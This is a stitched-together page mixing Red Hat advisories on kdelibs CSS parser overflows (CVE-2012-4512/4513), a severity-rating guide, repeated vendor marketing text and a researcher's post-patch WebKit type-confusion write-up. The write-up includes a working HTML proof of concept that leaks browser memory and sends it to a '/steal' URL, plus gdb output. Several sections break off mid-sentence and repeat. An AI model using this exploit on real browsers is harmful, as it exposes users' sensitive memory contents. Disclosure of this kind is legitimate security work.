| [Description](show_bug.cgi?id=865779#c0)  Jan Lieskovsky    2012-10-12 12:35:39 UTC  ``` A heap-based buffer overflow flaw was found in the way CSS parser DOM implementation of KDE libraries performed parsing of a location of the source for a particular font face. A remote attacker could provide a specially-crafted web page that, when opened in an application linked against KDE libraries (such as konqueror), would lead to that application crash or, potentially, arbitrary code execution with the privileges of the user running the application.

Subject: Medium risk security flaws in Konqueror

I recnetly discovered a number of memory corruption flaws in the Konqueror web
browser as used by KDE.

After discussions with the vendor, the following CVEs were assigned to these
vulnerabilities:

1) CVE-2012-4512
2) CVE-2012-4513
3) CVE-2012-4514
4) CVE-2012-4515

The attached advisory gives further details.

# RHSA-2012:1416 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Critical: kdelibs security update

## Type/Severity

Security Advisory: Critical

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2012%3A1416)

## Topic

Updated kdelibs packages that fix two security issues are now available for
Red Hat Enterprise Linux 6.

The Red Hat Security Response Team has rated this update as having critical
security impact. Common Vulnerability Scoring System (CVSS) base scores,
which give detailed severity ratings, are available for each vulnerability
from the CVE links in the References section.

## Description

The kdelibs packages provide libraries for the K Desktop Environment
(KDE). Konqueror is a web browser.

A heap-based buffer overflow flaw was found in the way the CSS (Cascading
Style Sheets) parser in kdelibs parsed the location of the source for font
faces. A web page containing malicious content could cause an application
using kdelibs (such as Konqueror) to crash or, potentially, execute
arbitrary code with the privileges of the user running the application.
(CVE-2012-4512)

A heap-based buffer over-read flaw was found in the way kdelibs calculated
canvas dimensions for large images. A web page containing malicious content
could cause an application using kdelibs to crash or disclose portions of
its memory. (CVE-2012-4513)

Users should upgrade to these updated packages, which contain backported
patches to correct these issues. The desktop must be restarted (log out,
then log back in) for this update to take effect.

## Solution

Before applying this update, make sure all previously-released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at
<https://access.redhat.com/knowledge/articles/11258>

Please note I accidentally put the CVE #'s one spot to low, they
should have been:

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

## Topic

Updated kdelibs packages that fix two security issues are now available for
Red Hat Enterprise Linux 6 FasTrack.

The Red Hat Security Response Team has rated this update as having critical
security impact. Common Vulnerability Scoring System (CVSS) base scores,
which give detailed severity ratings, are available for each vulnerability
from the CVE links in the References section.

[Updated 21st February 2013]
Packages previously available in this erratum were moved to RHBA-2013:0553
to prevent this erratum from incorrectly showing as a security update to
users that do not enable FasTrack channels and who had previously received
these security fixes via RHSA-2012:1416.

## Description

The kdelibs packages provide libraries for the K Desktop Environment
(KDE). Konqueror is a web browser.

A heap-based buffer overflow flaw was found in the way the CSS (Cascading
Style Sheets) parser in kdelibs parsed the location of the source for font
faces. A web page containing malicious content could cause an application
using kdelibs (such as Konqueror) to crash or, potentially, execute
arbitrary code with the privileges of the user running the application.
(CVE-2012-4512)

A heap-based buffer over-read flaw was found in the way kdelibs calculated
canvas dimensions for large images. A web page containing malicious content
could cause an application using kdelibs to crash or disclose portions of
its memory. (CVE-2012-4513)

Users should upgrade to these updated packages, which contain backported
patches to correct these issues. The desktop must be restarted (log out,
then log back in) for this update to take effect.

## Solution

Before applying this update, make sure all previously-released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at

### WebKit CSS Type Confusion

Here is an interesting WebKit vulnerability I came across and reported to Google, Apple and the WebKit.org developers.

**Description:** WebKit CSS Parser Type Confusion

**Software Affected:** Chrome 7/8, Safari 5.0.3, Epiphany 2.30.2, WebKit-r72146 (others untested)

**Severity:** Medium

The severity of the vulnerability was marked Medium by the Chrome developers because the bug can only result in an information leak. I don't have a problem with that but I have some more thoughts on it at the end of the post. But first the technical details.

The WebKit CSS parser internally stores a *CSSParserValueList* which contains a vector of *CSSParserValue* structures. These structures are used to hold the contents of parsed CSS attribute values such as integers, floating point numbers or strings. Here is what a *CSSParserValue* looks like.
```
struct CSSParserValue {
    int id;
    bool isInt;
    union {
        double fValue;
        int iValue;
        CSSParserString string;
        CSSParserFunction* function;
    };
    enum {
        Operator = 0x100000,
        Function = 0x100001,
        Q_EMS    = 0x100002
    };
    int unit;

    PassRefPtr createCSSValue();
};

```
When WebKit has successfully parsed a CSS value it will set the *unit* variable to a constant indicating what type it should be interpreted as. So depending on the value of *unit* a different member of the union will be used to address the CSS value later in the code. If the value was a floating point or an integer the *fValue* or *iValue* will store that number. If the value is a string a special *CSSParserString* structure is used to copy the string before placing it into the DOM as *element.style.src.*

The vulnerability exists in a function responsible for parsing the location of a font face source. So we find ourselves in *WebCore::CSSParser::parseFontFaceSrc()* found in CSSParser.cpp of the WebKit source. I have clipped certain parts of the function for brevity.
```
bool CSSParser::parseFontFaceSrc()
{
    ...
[3629]        } else if (val->unit == CSSParserValue::Function) {
[3630]            // There are two allowed functions: local() and format().
[3631]           CSSParserValueList* args = val->function->args.get();
[3632]            if (args && args->size() == 1) {
[3633]                if (equalIgnoringCase(val->function->name, "local(") && !expectComma) {
[3634]                    expectComma = true;
[3635]                    allowFormat = false;
[3636]                    CSSParserValue* a = args->current();
[3637]                    uriValue.clear();
[3638]                    parsedValue = CSSFontFaceSrcValue::createLocal(a->string);

```
At this point in the code the CSS parser has already extracted the value of the font face source and now the code is trying to determine whether the font value is local or not. If the source of the font is wrapped in a *local()* URL then we hit the code above. The problem here is that the *CSSParserValue*'s *unit* variable is never checked on line 3633. The code assumes the value previously parsed is a string and the *CSSParserString* structure within the union has already been initialized by a previous caller. Now on line 3636 a *CSSParserValue* pointer, *a,* is assigned to the value and on line 3638 the *a->string* operator is called on it. Here is what that structure looks like:
```
struct CSSParserString {
    UChar* characters;
    int length;

    void lower();

    operator String() const { return String(characters, length); }
    operator AtomicString() const { return AtomicString(characters, length); }
};

```
So when *a->string* is called in line 3638 WebKit's internal string functions will be called to create a string with a source pointer of *a->string.characters* with a length of *a->string.length* so it can be added to the DOM by *CSSParser::addProperty()*. This code assumes the value is a string but this *CSSParserValue* may not have been initialized as one. Lets take a second look at the union again in the *CSSParserValue structure*:
```
    union {
        double fValue;               // 64 bits
        int iValue;                  // 32 bits
        CSSParserString string;      // sizeof(CSSParserString)
        CSSParserFunction* function; // 32 bits
    };

```
The double *fValue* will occupy 64 bits in memory on a 32 bit x86 platform [[1](http://en.wikipedia.org/wiki/Double_precision_floating-point_format)]. This means in memory at runtime the first dword of *fValue* overlaps with *string.characters* and the second with *string.length*. If we can supply a specific floating point value as the source location of this font face we can trigger an information leak when WebKit interprets it as a *CSSParserString* structure and attempts to make a copy of the string. I should also note that the string creation uses *StringImpl::create* which copies the string using *memcpy*, so we don't have to worry about our stolen data containing NULL's. Exploiting this bug is very easy:
```
      < html>
      < script>
        function read_memory() {
            ele = document.getElementById('1');
            document.location = "http://localhost:4567/steal?s=" + encodeURI(ele.style.src);
        }
      < /script>
      < h1 id=1 style="src: local(0.(your floating point here) );" />
      < button onClick='read_memory()'>Click Me
      < /html>

```
That floating point number will occupy the first 64 bits of the union. The double *fValue* when holding this value will look like this in memory *0xbf95d38b 0x000001d5*. Which means (*a->string.characters* *= 0xbf95d38b*) and (*a->string.length* = *0x000001d5*). Through our floating point number we can control the exact address and length of an arbitrary read whose contents will then be added to the DOM as the source of the font face. In short, an attacker can steal as much content as he wants from anywhere in your browsers virtual memory. Here is the *CSSParserValue* structure in memory just after the assignment of the *CSSParserValue* pointer, *a,* when running the exploit.
```
(gdb) print *a
$167 = {id = 0, isInt = false, {fValue = 9.9680408499984197e-312, iValue = -1080700021,
string = {characters = 0xbf95d38b, length = 469}, function = 0xbf95d38b}, unit = 1}

(gdb) x/8x a
0xb26734f0:    0x00000000    0x00000100    0xbf95d38b    0x000001d5
0xb2673500:    0x00000001    0x00000000    0x00000000    0x00000000

```
Here is where the stack is mapped in my browser:
```
bf93a000-bf96e000 rw-p 00000000 00:00 0          [stack]

```
I did some testing of this bug using Gnome's Epiphany browser. It also uses WebKit and is a little easier to debug than Chrome. Here is a screenshot of the exploit using JavaScript to read 469 bytes from the stack and displaying it in an alert box:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNtNAYTABWkUy3qjVvkza2Mo51Wl3iYzc9AJQAldsULigbKQFse0Xfl6A3RYZ4u_YvDdnePt2NkH9MX6LXbcn0L29cG3I9WsLVgU52CtdpQc4eS8NTDQdWWBWjk6xHxfo4dyOh/s1600/poc.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNtNAYTABWkUy3qjVvkza2Mo51Wl3iYzc9AJQAldsULigbKQFse0Xfl6A3RYZ4u_YvDdnePt2NkH9MX6LXbcn0L29cG3I9WsLVgU52CtdpQc4eS8NTDQdWWBWjk6xHxfo4dyOh/s1600/poc.png)

OK so it's an info leak. No big deal... right? Info leaks are becoming more valuable as memory corruption mitigations such as ASLR (Address Space Layout Randomization) become more adopted by software vendors. An info leak essentially makes ASLR worthless because an attacker can use it to find out where your browsers heap is mapped or where a specific DLL with ROP gadgets resides in memory. Normally an info leak might come in the form of exposing a single address from an object or reading a few bytes off the end of an object, which exposes vftable addresses. These types of leaks also make exploitation easier but usually don't expose any of the web content displayed by the browser. In the case of this bug we have to specify what address to read from. If an unmapped address is used or the *read* walks off the end of a page then we risk crashing the process. The attacker doesn't have to worry about this on platforms without ASLR.

But almost as important as reliable code execution, the more sensitive content we push into web browsers the more valuable a highly reliable and controllable info leak could become. You could theoretically use it to read an open document or webmail or any other sensitive content the users browser has open at the time or has cached in memory from a previous site.

Anyways, hope you enjoyed the post, it was a fun vulnerability to analyze. Thanks to Google, Apple and WebKit for responding so quickly [[2](http://trac.webkit.org/changeset/72685/trunk/WebCore/css/CSSParser.cpp)], even to a Medium! Now go and update your browser.
